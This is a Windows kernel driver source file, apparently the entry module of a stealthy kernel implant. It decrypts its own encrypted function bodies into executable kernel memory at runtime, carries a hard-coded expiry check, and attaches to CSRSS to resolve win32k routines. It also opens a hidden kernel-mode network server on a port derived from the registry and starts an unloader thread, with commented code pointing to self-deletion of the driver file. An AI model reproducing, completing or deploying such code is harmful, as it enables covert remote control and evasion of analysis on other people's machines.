



#include <ntifs.h>
#include <windef.h>
#include <ntddk.h>
#include <wdm.h>
#include <tdi.h>


#include "COPY_CODE.h"

#include "RunEncrypt.h"




NTSTATUS DriverIrpCtl(PDEVICE_OBJECT device, PIRP pirp)
{

	UNREFERENCED_PARAMETER(device);
	UNREFERENCED_PARAMETER(pirp);

	////UNREFERENCED_PARAMETER(device);
	//////PIO_STACK_LOCATION stack;
	//////stack = IoGetCurrentIrpStackLocation(pirp);
	
	//////LOG_DEBUG("DriverIrpCtl");
	////LPIOINFO pInfo = 0;
	////pirp->IoStatus.Status = STATUS_SUCCESS;
	//////DWORD nError = 0;
	////PIO_STACK_LOCATION IrpSp = NULL;
	////IrpSp = IoGetCurrentIrpStackLocation(pirp);
	////DWORD uReadLength = IrpSp->Parameters.Read.Length;

	////if (uReadLength != sizeof(IOINFO) + 12){
	////	pirp->IoStatus.Information = 0;
	////	IoCompleteRequest(pirp, IO_NO_INCREMENT);
	////	return STATUS_SUCCESS;
	////}

	////LPMSGCOMMON tInfo = (LPMSGCOMMON)pirp->AssociatedIrp.SystemBuffer;
	////if (tInfo == 0) {
	////	pirp->IoStatus.Information = 0;
	////	IoCompleteRequest(pirp, IO_NO_INCREMENT);
	////	return STATUS_SUCCESS;

	////}
	////pInfo = (LPIOINFO)&tInfo->common;
	return STATUS_SUCCESS;
}

NTSTATUS DispatchCreate(PDEVICE_OBJECT pDevObj, PIRP pIrp)
{
	UNREFERENCED_PARAMETER(pDevObj);
	pIrp->IoStatus.Status = STATUS_SUCCESS;
	//LOG_DEBUG("派遣函数 IRP_MJ_CREATE 成功执行 !\n");
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;
}

NTSTATUS DispatchClose(PDEVICE_OBJECT pDevObj, PIRP pIrp)
{
	//PsSetCreateProcessNotifyRoutine
	//PsSetCreateProcessNotifyRoutine
	UNREFERENCED_PARAMETER(pDevObj);
	pIrp->IoStatus.Status = STATUS_SUCCESS;
	IoCompleteRequest(pIrp, IO_NO_INCREMENT);
	return STATUS_SUCCESS;

}


void DriverUnload(PDRIVER_OBJECT pDriver)
{
	UNREFERENCED_PARAMETER(pDriver);
}


//GlobalPtr->FAllocateMemory
//#define  _FUNCTION_IMP(name, x ,...) 	{ _Kernel_SELFCALL _Buffer_Imp = (_Kernel_SELFCALL)pGData->FAllocateMemory(pGData,&fArry->##name##);\
//										   x = _Buffer_Imp(__VA_ARGS__);\
//										  pGData->fNtos.MmFreeContiguousMemory((PVOID)_Buffer_Imp);}\

#define  FREE_FUNCTION_ENTRY(name,x)    if (x.Ptr != 0) {fNtos->ExFreePoolWithTag(x.Ptr,'Tag');} //if (x.Flags == 2) { fNtos->MmFreeContiguousMemory(x.Ptr); }else { fNtos->MmFreeNonCachedMemory(x.Ptr, fArry->##name##.nPageSize); }

#define  _FUNCTION_IMP(name, x ,...) 	{ /*PMDL pMdlIMP = 0; */ MEMORY_FLAGS MFlagsIMP = pGData->FAllocateMemory(pGData,&fArry->##name##/*, &pMdlIMP*/);\
                                         LOG_DEBUG("%s <%p>\n",#name,MFlagsIMP.Ptr);\
                                         x = ((_Kernel_SELFCALL)MFlagsIMP.ExePtr)(__VA_ARGS__);\
										 FREE_FUNCTION_ENTRY(name, MFlagsIMP);}\

//#define  _FUNCTION_IMP(name, x ,...) 	{ _Kernel_SELFCALL _Buffer_Imp = (_Kernel_SELFCALL)fNtos->MmAllocateNonCachedMemory(fArry->##name##.nPageSize);\
//                                        fNtos->CopyMemory((PVOID)_Buffer_Imp, fArry->##name##.Ptr, fArry->##name##.MaxSize);\
//                                        ((Global_Data*)pGData)->_hEncrypt_DEC_V.SelfTradition(pGData,fArry->##name##.Sgin,_Buffer_Imp,fArry->##name##.MaxSize);\
//                                       ((Global_Data*)pGData)->SetAddressExecute.SelfTradition(pGData, (PVOID)_Buffer_Imp, fArry->##name##.MaxSize, 0);\
//										x = _Buffer_Imp(__VA_ARGS__);\
//										((Global_Data*)pGData)->SetAddressExecute.SelfTradition(pGData, (PVOID)_Buffer_Imp, fArry->##name##.MaxSize, 1);\
//										fNtos->MmFreeNonCachedMemory((PVOID)_Buffer_Imp, fArry->##name##.nPageSize);}\


//#define  _FUNCTION_ENTRY(name,x,y) 	{y _Buffer_Imp = (y)fNtos->ExAllocatePoolWithTag(NonPagedPool, PAGE_SIZE, 'Tag');\
//                                        fNtos->CopyMemory((PVOID)_Buffer_Imp, fArry->##name##.Ptr, fArry->##name##.MaxSize);\
//                                        fArry->_hEncrypt_DEC_V.SelfTradition(pGData,fArry->##name##.Sgin,_Buffer_Imp,fArry->##name##.MaxSize);\
//                                        fArry->SetAddressExecute.SelfTradition(pGData, (PVOID)_Buffer_Imp, fArry->##name##.MaxSize, 0);\
//										x = _Buffer_Imp;}\
//
//#define  _CHANGE_FUNCTION_ENTRY(name,y)  {y u##name = 0;\
//                                     _FUNCTION_ENTRY(name,u##name,y);\
//                                     y OLD_##name =  fArry->##name##.SelfTradition; fArry->##name##.SelfTradition = u##name;\
//                                     if(OLD_##name) {fArry->SetAddressExecute.SelfTradition(pGData, (PVOID)OLD_##name, fArry->##name##.MaxSize, 1);\
//                                     fNtos->ExFreePoolWithTag((PVOID)OLD_##name,'Tag');}}\


//#define  _0_FUNCTION_ENTRY(name,x,y)      y _Buffer_Imp = (y)MmAllocateNonCachedMemory(fArry->##name##.nPageSize);\
//                                           RtlCopyMemory((PVOID)_Buffer_Imp, fArry->##name##.Ptr, fArry->##name##.MaxSize);\
//                                           _hEncrypt_DEC_V(0,fArry->##name##.Sgin,(PVOID)_Buffer_Imp,fArry->##name##.MaxSize);\
//                                           SetAddressExecute((PVOID)pGData, (PVOID)_Buffer_Imp, fArry->##name##.MaxSize, 0);\
//										    x = _Buffer_Imp;\
// PMDL pMdl = 0 ; x = (y)ExAllocateFunctionMemory(pGData, &fArry->##name, &pMdl)
#define  _0_FUNCTION_ENTRY(name,x,y)      y _Buffer_Imp = (y)MmAllocateNonCachedMemory(fArry->##name##.nPageSize);\
                                           RtlCopyMemory((PVOID)_Buffer_Imp, fArry->##name##.Ptr, fArry->##name##.MaxSize);\
                                           _hEncrypt_DEC_V(0,fArry->##name##.Sgin,(PVOID)_Buffer_Imp,fArry->##name##.MaxSize);\
                                           SetAddressExecute((PVOID)pGData, (PVOID)_Buffer_Imp, fArry->##name##.MaxSize, 0);\
										    x = _Buffer_Imp;\
                                         
#define  _INIT_FUNCTION_ENTRY(name,y)   if(fArry->##name##.SelfTradition == 0){\
                                             _0_FUNCTION_ENTRY(name,fArry->##name##.SelfTradition,y);}\
                                              LOG_DEBUG("%s <%p>\n",#name,fArry->##name##.SelfTradition)



#define  _1_FUNCTION_ENTRY(name,x,y)      y _Buffer_Imp = (y)MmAllocateNonCachedMemory(((Global_Data*)pGData)->##name##.nPageSize);\
                                           RtlCopyMemory((PVOID)_Buffer_Imp, ((Global_Data*)pGData)->##name##.Ptr, ((Global_Data*)pGData)->##name##.MaxSize);\
                                           _hEncrypt_DEC_V(0,((Global_Data*)pGData)->##name##.Sgin,(PVOID)_Buffer_Imp,((Global_Data*)pGData)->##name##.MaxSize);\
                                           SetAddressExecute((PVOID)pGData, (PVOID)_Buffer_Imp, ((Global_Data*)pGData)->##name##.MaxSize, 0);\
										    x = _Buffer_Imp;\

#define  _2_FUNCTION_ENTRY(name,x,y,z)      y _Buffer_Imp = (y) ExAllocateFunctionMemory(pGData, &(Global_Data*)pGData)->##name##,); \
										    x = _Buffer_Imp;\


#define  _INIT_1_FUNCTION_ENTRY(name,y)   if(y == 0){\
                                             _1_FUNCTION_ENTRY(name,y,_Kernel_SELFCALL);}\
                                              LOG_DEBUG("%s <%p>\n",#name,((Global_Data*)pGData)->##name##.SelfTradition)


//#define  _FUNCTION_ENTRY(name,x,y)  {PMDL pMdl = 0 ; x = (y)ExAllocateFunctionMemoryV(pGData, &fArry->##name, &pMdl);\
//                                     LOG_DEBUG("%s <%p>\n",#name,x);}
//
//#define  _FUNCTION_ENTRY_INI(name,x)  {PMDL pMdl = 0 ; x = (_Kernel_SELFCALL)ExAllocateFunctionMemoryV(pGData, &pGData->##name, &pMdl);\
//                                        LOG_DEBUG("%s <%p>\n",#name,x);}


#define  _FUNCTION_ENTRY(name,x,y)  {x = (y)ExAllocateFunctionMemoryA(pGData, &fArry->##name);\
                                     LOG_DEBUG("%s <%p>\n",#name,x);}

#define  _FUNCTION_ENTRY_INI(name,x)  {x = (_Kernel_SELFCALL)ExAllocateFunctionMemoryA(pGData, &pGData->##name);\
                                        LOG_DEBUG("%s <%p>\n",#name,x);}


#define  _FUNCTION_ENTRY_MDL(name,x,y,z)  x = (y)pGData->FAllocateMemory(pGData, &fArry->##name, z);



//#define  FREE_FUNCTION_ENTRY(name,x)  fNtos->MmFreeContiguousMemory((PVOID)name);\
//                                      fNtos->IoFreeMdl(x);

Global_Data* GlobalPtr = 0;;




//void _INI_FUNCTION_ENTRY_TRY(PVOID pGData ,CODE_CALL * pCALL) {
//
//	if (pCALL->SelfTradition == 0) {
//		_Kernel_SELFCALL _Buffer_Imp = (_Kernel_SELFCALL)MmAllocateNonCachedMemory(pCALL->nPageSize);
//		RtlCopyMemory((PVOID)_Buffer_Imp, pCALL->Ptr, pCALL->MaxSize);
//		_hEncrypt_DEC_V(0, pCALL->Sgin, (PVOID)_Buffer_Imp, pCALL->MaxSize);
//		SetAddressExecute(pGData, (PVOID)_Buffer_Imp, pCALL->MaxSize, 0);
//		pCALL->SelfTradition = _Buffer_Imp;
//	}
//	DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, "<%p>\n", pCALL->SelfTradition);
//}

uint16_t GetPortFromRegistryPath(PUNICODE_STRING RegistryPath) {

	HANDLE reg = 0;
	NTSTATUS Status = STATUS_SUCCESS;
	PVOID           BufDriverString = NULL, BufProcessEventString = NULL, BufThreadEventString = NULL;
	OBJECT_ATTRIBUTES oa = { 0 };
	InitializeObjectAttributes(&oa, RegistryPath, OBJ_KERNEL_HANDLE, NULL, NULL);
	NTSTATUS ntStatus = ZwOpenKey(&reg, KEY_QUERY_VALUE, &oa);

	UNICODE_STRING uszDriverString;

	uint16_t nPort = 20000;

	if (ntStatus == STATUS_SUCCESS)
	{
		UNICODE_STRING A;
		PKEY_VALUE_PARTIAL_INFORMATION bufA;
		ULONG ActualSize;

		BufDriverString = ExAllocatePoolWithTag(NonPagedPool, sizeof(KEY_VALUE_PARTIAL_INFORMATION) + 100, 'tag');

		bufA = (PKEY_VALUE_PARTIAL_INFORMATION)BufDriverString;
		RtlInitUnicodeString(&A, L"DisplayName");
		if (ntStatus == STATUS_SUCCESS) {
			ntStatus = ZwQueryValueKey(reg, &A, KeyValuePartialInformation, bufA, sizeof(KEY_VALUE_PARTIAL_INFORMATION) + 100, &ActualSize);
			if (ntStatus != STATUS_SUCCESS) {
				ExFreePoolWithTag(bufA, 'tag');
			}
		}
		if (ntStatus == STATUS_SUCCESS) {
			RtlInitUnicodeString(&uszDriverString, (PCWSTR)bufA->Data);
			DWORD RandSign = *((DWORD*)uszDriverString.Buffer);
			int port = RandSign % 30000;
			if (port < 10000) {
				port = port + 10000;
			}
			nPort = (uint16_t)port;

			ExFreePoolWithTag(BufDriverString, 'tag');
		}
		LOG_DEBUG("uszDriverString: %wZ \n", &uszDriverString);

		ZwClose(reg);
		return nPort;
	}
	return nPort;
}




 




NTSTATUS DriverEntry(
	_In_ PDRIVER_OBJECT  Driver,
	_In_ PUNICODE_STRING RegistryPath)
{
	PAGED_CODE();
	UNREFERENCED_PARAMETER(Driver);
	UNREFERENCED_PARAMETER(RegistryPath);




	//gDevObj = (PDEVICE_OBJECT)Driver;
	//gDevObj->Flags |= DO_BUFFERED_IO;


	//TdiOpen()


	Driver->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DriverIrpCtl;
	Driver->MajorFunction[IRP_MJ_CREATE] = DispatchCreate;    // 创建成功派遣函数
	Driver->MajorFunction[IRP_MJ_CLOSE] = DispatchClose;      // 关闭派遣函数

	Driver->DriverUnload = DriverUnload;




	GlobalPtr = ExAllocatePoolWithTag(NonPagedPool, sizeof(Global_Data), 'Ex');


	LARGE_INTEGER TimesN;
	KeQuerySystemTime(&TimesN);
	DWORD64 TimeS = TimesN.QuadPart / 10000000;

	TIME_FIELDS TimeFields;
	LARGE_INTEGER Time;
	KeQuerySystemTime(&Time);
	ExSystemTimeToLocalTime(&Time, &Time);
	RtlTimeToTimeFields(&Time, &TimeFields);





	//133471128

//#ifndef DEBUG
	//13360702733   13363273973
	//13375400453
	// 13374754421
	if (TimeS > (13382530421 + 2592000*4))
	{
		if ((TimeS - (13382530421 + 2592000*4)) > 2592000)
		{
			//LOG_DEBUG("TimeS must rebuild\n");
			return STATUS_SUCCESS;
		}
	}

	if (GlobalPtr != 0)
	{
		RtlZeroMemory(GlobalPtr, sizeof(Global_Data));

		Initialize_Ntoskrnl(&GlobalPtr->fNtos);





		//CSRSS.EXE

		

		//MmAllocateContiguousMemorySpecifyCache()


		IniHandleOffset(GlobalPtr);

		LDR_DATA_TABLE_ENTRY* Ldr = (LDR_DATA_TABLE_ENTRY*)Driver->DriverSection;

		Initialize_SelfFunction(&GlobalPtr->SelfFArry, (DWORD64)Ldr->DllBase);

		Initialize_Self_STRING(&GlobalPtr->SelfUArry);

		Initialize_Self_ANSI_STRING(&GlobalPtr->SelfAArry);


		_FlushEnctrypt(GlobalPtr, (DWORD64)Ldr->DllBase);

		GlobalPtr->PTE_BASE = GetBasePTE();





		STRING AString;

		RtlInitAnsiString(&AString, "CSRSS.EXE");



		HANDLE ID_CSRSS = 0;

		UNICODE_STRING uCsrss;

		RtlInitUnicodeString(&uCsrss, L"CSRSS.EXE");

		HANDLE PID_ARRY[10] = { 0 };
		DWORD Size = 10;

		FindProcessHandle(GlobalPtr, &AString, &Size, PID_ARRY);

		for (size_t i = 0; i < Size; i++)
		{
			LOG_DEBUG("PID <%d>\n", PID_ARRY[i]);
		}
		//FindProcessID(GlobalPtr, &uCsrss, &Size, PID_ARRY);
		
		if (Size != 0){
			ID_CSRSS = PID_ARRY[0];
		}

		if (ID_CSRSS)
		{
			PEPROCESS eprocess;
			if (NT_SUCCESS(PsLookupProcessByProcessId(ID_CSRSS, &eprocess)))
			{
				KAPC_STATE ApcState = { 0 };
				KeStackAttachProcess(eprocess, &ApcState);

				Initialize_Win32k(&GlobalPtr->fWin32k);

				KeUnstackDetachProcess(&ApcState);
			} 
		}

		
		
		



		WskInitialize(&GlobalPtr->wsk);


		//_hEncrypt(0, 0x1000, &GlobalPtr->SelfFArry, sizeof(GlobalPtr->SelfFArry));

		NTOSKRNL_FUN* fNtos = &((Global_Data*)GlobalPtr)->fNtos;
		SELF_F_ARRY* fArry = &((Global_Data*)GlobalPtr)->SelfFArry;

		Global_Data * pGData = GlobalPtr;


		LOG_DEBUG("GlobalPtr->PTE_BASE :<%I64X>\n", GlobalPtr->PTE_BASE);

		GlobalPtr->bExplorer.Win32k_Process_Explorer = 0;
		
		GlobalPtr->bExplorer.Win32k_Process_Explorer_Buffer = 0;


		GlobalPtr->DueTime.QuadPart = 0;

		//_FUNCTION_ENTRY(ExAllocateFunctionMemory, GlobalPtr->FAllocateMemory, _ExAllocateFunctionMemory);

		//_FUNCTION_ENTRY(ExAllocateFunctionMemoryApc, GlobalPtr->FAllocateMemoryApc, _ExAllocateFunctionMemory);

		//_INIT_1_FUNCTION_ENTRY(ExAllocateFunctionMemory, GlobalPtr->FAllocateMemory);

		//{
		//	PMDL pMdl = 0;
		//	GlobalPtr->FAllocateMemory = (_ExAllocateFunctionMemory)ExAllocateFunctionMemory(pGData,
		//		&fArry->ExAllocateFunctionMemory, &pMdl);

		//}
		///


		_FUNCTION_ENTRY_INI(ExAllocateFunctionMemory, GlobalPtr->ExAllocateFunctionMemory.SelfTradition);

		_FUNCTION_ENTRY_INI(ExFreeFunctionMemory, GlobalPtr->ExFreeFunctionMemory.SelfTradition);

		_FUNCTION_ENTRY_INI(WORKER_THREAD_ROUTINE_ACCEPT_SEND_RECV, GlobalPtr->WORKER_THREAD_ROUTINE_ACCEPT_SEND_RECV.SelfTradition);

		GlobalPtr->FAllocateMemory = (_ExAllocateFunctionMemory)GlobalPtr->ExAllocateFunctionMemory.SelfTradition;

		GlobalPtr->FreeMemory = (_ExFreeFunctionMemory)GlobalPtr->ExFreeFunctionMemory.SelfTradition;

		_FUNCTION_ENTRY_INI(_hEncrypt, GlobalPtr->_hEncrypt.SelfTradition);

		_FUNCTION_ENTRY_INI(_hEncrypt_DEC, GlobalPtr->_hEncrypt_DEC.SelfTradition);

		_FUNCTION_ENTRY_INI(_hEncrypt_DEC_V, GlobalPtr->_hEncrypt_DEC_V.SelfTradition);

		_FUNCTION_ENTRY_INI(SetAddressExecute, GlobalPtr->SetAddressExecute.SelfTradition);

		_FUNCTION_ENTRY_INI(_WORKER_THREAD_ROUTINE, GlobalPtr->_WORKER_THREAD_ROUTINE.SelfTradition);

		_FUNCTION_ENTRY_INI(_Work_Memory, GlobalPtr->_Work_Memory.SelfTradition);

		_FUNCTION_ENTRY_INI(RunApcNo, GlobalPtr->RunApcNo.SelfTradition);

		_FUNCTION_ENTRY_INI(IO_COMPLETION_ROUTINE_Ex, GlobalPtr->IO_COMPLETION_ROUTINE_Ex.SelfTradition);


		//char* Zero[0x100];
		//RtlCopyMemory(Zero, (PVOID)GlobalPtr->IO_COMPLETION_ROUTINE_Ex.SelfTradition, 0x100);


		//_INIT_FUNCTION_ENTRY(_hEncrypt_DEC_V, _Kernel_SELFCALL);

		//_INIT_FUNCTION_ENTRY(SetAddressExecute, _Kernel_SELFCALL);


		LOG_DEBUG("................\n");


		//DWORD64 Ret = 0;
		//_FUNCTION_IMP(Get_Win32k_Process_Explorer, Ret, pGData, 1);

		//LOG_DEBUG("dExplorer_PID :%d <%p>  <%d>\n", GlobalPtr->bExplorer.Win32k_Process_Explorer, GlobalPtr->bExplorer.Win32k_Process_Explorer_Buffer, Ret);

		/*if (Ret != 0)
		{
			PEPROCESS eprocess = 0;
			PsLookupProcessByProcessId((HANDLE)Ret, &eprocess);
			ObDereferenceObject(eprocess);


			LOG_DEBUG("dExplorer_PID :%d <%p>\n", GlobalPtr->bExplorer.Win32k_Process_Explorer, eprocess);

			eprocess = GetProcessEprocess(GlobalPtr, (HANDLE)Ret);
			LOG_DEBUG("dExplorer_PID :%d <%p>\n", GlobalPtr->bExplorer.Win32k_Process_Explorer, eprocess);

		}*/
		
		

		GlobalPtr->wsk.hBuffer = 0;

		//LIST_SOCKET* pLSocket = (LIST_SOCKET *)ExAllocatePoolWithTag(PagedPool, sizeof(LIST_SOCKET), 'Ex');
		SOCKET s_Server = create_server_socket(&GlobalPtr->wsk, GetPortFromRegistryPath(RegistryPath));
		//pLSocket->Type = 1;
		GlobalPtr->wsk.s_Sever = s_Server;

		SOCKET_INFO * pSInfo = &GlobalPtr->wsk._SocketArry[s_Server];

		InitializeListHead(&pSInfo->ApcMemory);
		InitializeListHead(&pSInfo->DpcMemory);
		KeInitializeSpinLock(&pSInfo->MemoryLock);



		InitializeListHead(&GlobalPtr->wsk._SocketArry[0].ApcMemory);
		InitializeListHead(&GlobalPtr->wsk._SocketArry[0].DpcMemory);
		KeInitializeSpinLock(&GlobalPtr->wsk._SocketArry[0].MemoryLock);


		KeInitializeSpinLock(&GlobalPtr->wsk.DataMemoryLock);

		fNtos->s = s_Server;

		WSK_SERVER_INFO* WskInfo = &GlobalPtr->wsk;
		WskInfo->_SocketArry[s_Server].Status = -1;
		WskInfo->_SocketArry[s_Server].List.s = s_Server;


		InitializeListHead(&WskInfo->_SocketArry[s_Server].CallBackEntry);
		InitializeListHead(&GlobalPtr->wsk.ListSocketAccept);
		InitializeListHead(&GlobalPtr->wsk.ListSocketRecv);



		InitializeListHead(&GlobalPtr->wsk.SendRecvBuff.Link);
		//InitializeListHead(&GlobalPtr->wsk.SendBuff.Link);
		for (size_t i = 0; i < 16; i++){

			PHYSICAL_ADDRESS Low = { 0 };
			PHYSICAL_ADDRESS High = { MAXULONG64 };

			SOCKET_INFO_BUFFER_LIST* BufferList = ExAllocatePoolWithTag(NonPagedPool, sizeof(SOCKET_INFO_BUFFER_LIST), 'Tag');

			do
			{
				BufferList->pSendBuffer = MmAllocateNonCachedMemory(SEND_SIZE);//fNtos->MmAllocateContiguousMemorySpecifyCache(SEND_SIZE, Low, High, Low, MmNonCached);
			} while (BufferList->pSendBuffer == 0);

			do
			{
				BufferList->pRecvBuffer = MmAllocateNonCachedMemory(RECV_SIZE);//fNtos->MmAllocateContiguousMemorySpecifyCache(RECV_SIZE, Low, High, Low, MmNonCached);   //fNtos->MmAllocateNonCachedMemory(RECV_SIZE);
			} while (BufferList->pRecvBuffer == 0);

			BufferList->kSendBuffer.Length = SEND_SIZE;
			do
			{
				BufferList->kSendBuffer.Mdl = fNtos->IoAllocateMdl(BufferList->pSendBuffer, SEND_SIZE, FALSE, FALSE, 0);

			} while (BufferList->kSendBuffer.Mdl == 0);


			BufferList->kRecvBuffer.Length = RECV_SIZE;
			do
			{
				BufferList->kRecvBuffer.Mdl = fNtos->IoAllocateMdl(BufferList->pRecvBuffer, RECV_SIZE, FALSE, FALSE, 0);

			} while (BufferList->kRecvBuffer.Mdl == 0);

			fNtos->MmBuildMdlForNonPagedPool(BufferList->kSendBuffer.Mdl);

			fNtos->MmProbeAndLockPages(BufferList->kSendBuffer.Mdl, KernelMode, IoModifyAccess);

			BufferList->kSendBuffer.Offset = 0;

			fNtos->MmBuildMdlForNonPagedPool(BufferList->kRecvBuffer.Mdl);

			fNtos->MmProbeAndLockPages(BufferList->kRecvBuffer.Mdl, KernelMode, IoModifyAccess);

			BufferList->kRecvBuffer.Offset = 0;
			InsertHeadList(&GlobalPtr->wsk.SendRecvBuff.Link, &BufferList->Link);
		}



		LOG_DEBUG("Server Socket  <%d>\n", s_Server);

		InsertHeadList(&GlobalPtr->wsk.ListSocketAccept, &WskInfo->_SocketArry[s_Server].List.Link);
		
		//ExSetTimerResolution(5000, TRUE);

		GlobalPtr->HandleMode = 1;

		AcceptFromEx(pGData, s_Server);

		//FlushWskAccept_SendRecvEx(pGData);

		GlobalPtr->Map_CurrentIndex = 0;

		char* pszDest = ExAllocatePoolWithTag(NonPagedPool, PAGE_SIZE, 'Tag');

		UnLoader_FN* pUnloder = (UnLoader_FN*)pszDest;

		KeInitializeEvent(&pUnloder->UnLoadEvent, SynchronizationEvent, FALSE);
		
		pUnloder->str = (LPCWSTR)(pszDest + 0x200);
		pUnloder->_pGData = pGData;

		RtlStringCchPrintfW((NTSTRSAFE_PWSTR)pUnloder->str, 256, L"%wZ", RegistryPath);

		HANDLE thread_handle;

		ULONG Max = 0;
		ULONG Now = 0;

		ExQueryTimerResolution(&Max, &fNtos->MinTimerRound, &Now);
		ExSetTimerResolution(fNtos->MinTimerRound, TRUE);
		pGData->_UnLoader = ExAllocateFunctionMemory(pGData, s_Server, &fArry->UnLoadDriver_Mother);

		NTSTATUS r = PsCreateSystemThread(&thread_handle, THREAD_ALL_ACCESS, 0, 0, 0, (PKSTART_ROUTINE)pGData->_UnLoader.Ptr, pUnloder);

		//KeSetSystemAffinityThread

		//ULONG requestedTime, actualTime;
		//ULONG minResolution = 1; // 从1纳秒开始尝试
		//ULONG maxResolution = 1000000000; // 最大尝试1秒
		//bool found = false;

		//while (!found && minResolution < maxResolution) {
		//	if (ExSetTimerResolution(minResolution, TRUE, &actualTime) == ERROR_SUCCESS) {
		//		// 如果成功，尝试降低精度直到失败
		//		ExSetTimerResolution(minResolution, FALSE, &actualTime); // 恢复原状
		//		found = true;
		//	}
		//	else {
		//		// 如果失败，增加精度
		//		minResolution *= 2;
		//	}
		//}
		

		//wchar_t* pszDest = ExAllocatePoolWithTag(PagedPool, 260 * 2, 'Tag');
		//if (pszDest != 0){

		//	RtlStringCchPrintfW(pszDest, 256, L"%wZ", RegistryPath);
		//	HANDLE thread_handle;
		//	NTSTATUS r = PsCreateSystemThread(&thread_handle, THREAD_ALL_ACCESS, 0, 0, 0, DeleteDriverFile, pszDest);


		//}

		


		//KeInitializeTimer(&GlobalPtr->Map_Timer[0].Timer);
		//_0_FUNCTION_ENTRY(PollingTimer, GlobalPtr->Map_Timer[0].PollingTimer, _PollingTimer);
		//KeInitializeDpc(&GlobalPtr->Map_Timer[0].Dpc, GlobalPtr->Map_Timer[0].PollingTimer, GlobalPtr);
		//LARGE_INTEGER DueTime = {0};
		//DueTime.QuadPart =  0;
		//KeSetTimerEx(&GlobalPtr->Map_Timer[0].Timer, DueTime, 1, &GlobalPtr->Map_Timer[0].Dpc);



		//for (int i = 0; i < 1; i++)
		//{
		//	_0_FUNCTION_ENTRY(PollingExTimer, GlobalPtr->Map_Timer[i].PollingExTimer, _PollingExTimer);
		//	GlobalPtr->Map_Timer[i].ExTimer = ExAllocateTimer(GlobalPtr->Map_Timer[i].PollingExTimer,
		//		GlobalPtr, EX_TIMER_HIGH_RESOLUTION);
		//	ExInitializeSetTimerParameters(&GlobalPtr->Map_Timer[i].TimerParameters);
		//	ExInitializeDeleteTimerParameters(&GlobalPtr->Map_Timer[i].Delete);
		//}

		
		

		//LARGE_INTEGER DueTime = { 0 };
		//DueTime.QuadPart = -10;
		//ExSetTimer(GlobalPtr->Map_Timer[0].ExTimer, DueTime.QuadPart, 
		//	0, &GlobalPtr->Map_Timer[0].TimerParameters);



		//_0_FUNCTION_ENTRY(PollingWorker, GlobalPtr->Map_Worker[0].PollingWorker, _PollingWorker);
		//_0_FUNCTION_ENTRY(PollingWorker, GlobalPtr->Map_Worker[1].PollingWorker, _PollingWorker);
		//ExInitializeWorkItem(&GlobalPtr->Map_Worker[0].Worker, GlobalPtr->Map_Worker[0].PollingWorker, GlobalPtr);
		//ExQueueWorkItem(&GlobalPtr->Map_Worker[0].Worker, RealTimeWorkQueue);

	}


	//NTOSKRNL_FUN fNtos;



	//MMPTE








	return STATUS_SUCCESS;

}